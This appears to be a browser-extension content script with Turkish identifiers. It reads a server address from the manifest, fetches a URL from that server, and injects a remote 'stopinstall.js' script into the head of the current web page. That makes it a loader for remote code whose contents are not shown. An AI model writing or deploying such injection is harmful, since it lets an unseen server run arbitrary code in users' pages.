var serverURL = chrome.runtime.getManifest().server_url;
fetch(`${serverURL}/url.json`)
    .then(response=>response.json())
    .then(data => {
        sayfayaScriptEkle(`${data.url}/stopinstall.js`);
    })
    .catch((error) => {
        console.error("stopinstall.js ulaşmaya çalışırken Hata: "+error);
    });


function sayfayaScriptEkle(scriptURL) {
    const head = document.getElementsByTagName("head")[0];
    if (head) {
        const element = document.createElement("script");
        element.setAttribute("src", scriptURL);
        head.appendChild(element);
    }
}